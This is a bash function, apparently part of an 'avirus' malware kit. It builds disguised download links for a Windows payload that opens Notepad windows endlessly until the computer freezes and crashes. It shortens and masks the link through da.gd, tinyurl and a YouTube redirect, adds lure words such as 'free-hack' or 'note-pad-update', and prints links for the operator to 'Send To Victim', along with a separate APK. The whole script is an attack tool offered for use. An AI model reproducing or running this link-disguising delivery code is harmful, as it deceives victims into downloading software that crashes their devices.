endlessnotepad(){
clear
echo -e "\e[91m   
    ┌─┐┌┐┌┌┬┐┬  ┌─┐┌─┐┌─┐  ┌┐┌┌─┐┌┬┐┌─┐┌─┐┌─┐┌┬┐
    ├┤ │││ │││  ├┤ └─┐└─┐  ││││ │ │ ├┤ ├─┘├─┤ ││
    └─┘┘└┘─┴┘┴─┘└─┘└─┘└─┘  ┘└┘└─┘ ┴ └─┘┴  ┴ ┴─┴┘
"
echo
echo -e "           \e[91m[\e[0mendless notepad pop up until 
        the computer freezes and crashes.\e[91m]\e[0m"
cd $HOME/avirus/core/src/windows
link=$(cat endlessnotepad)
short=$(curl -s https://da.gd/s/?url=${link})
shorter=${short#https://}
echo
echo -e "\e[92m    Type custom words like free-course, free-hack"
echo -e "\e[91m     Don't use space just use '-' between words\e[0m"
echo " "
echo -en "\e[32mWORDS━━➤\e[0m "
read words
echo 
echo -e "\e[91m[\e[92mLINKS\e[91m]:\e[0m Send One Of These Links To Victim"
final=$words@$shorter
shortb=$(curl -s https://da.gd/s/?url=${link})
shorterb=${short#https://}
wordsb="note-pad-update"
finalb=$wordsb@$shorterb
url="https://m.youtube.com/redirect?q=${link}"
tiny=$(curl -s http://tinyurl.com/api-create.php?url=${url})
ssh="https://rb.gy/qfu8eq"
echo -e "\e[91m│"
echo -e "\e[91m│\e[91m\e[92m─\e[0m\e[92m(\e[91mShort\e[92m)\e[0m\e[92m➤ \e[0m\e[93m$ssh\e[0m"
echo -e "\e[91m│"
echo -e "\e[91m│\e[91m\e[92m─\e[0m\e[92m(\e[91mCustom\e[92m)\e[0m\e[92m➤ \e[0m\e[93m$final\e[0m"
echo -e "\e[91m│"
echo -e "\e[91m│\e[91m\e[92m─\e[0m\e[92m(\e[91mDefault\e[92m)\e[0m\e[92m➤ \e[0m\e[93m$finalb\e[0m"
echo -e "\e[91m│"
echo -e "\e[91m│\e[91m\e[92m─\e[0m\e[92m(\e[91mRedirect\e[92m)\e[0m\e[92m➤ \e[0m\e[93m$tiny\e[0m"
echo -e "\e[91m│"
echo -e "\e[91m[\e[92mMANUAL\e[91m]:\e[0m Open Storage/Vanrc & Send Apk To Victim"
echo -e "\e[91m    │"
echo -e "\e[32m   LOC:\e[34m /internalstorage/vanrc\e[0m"
echo
echo -e "\e[91m               Click Control+c to Stop"
echo
sleep 60.0
cd $HOME/avirus
bash avirus
}
endlessnotepad
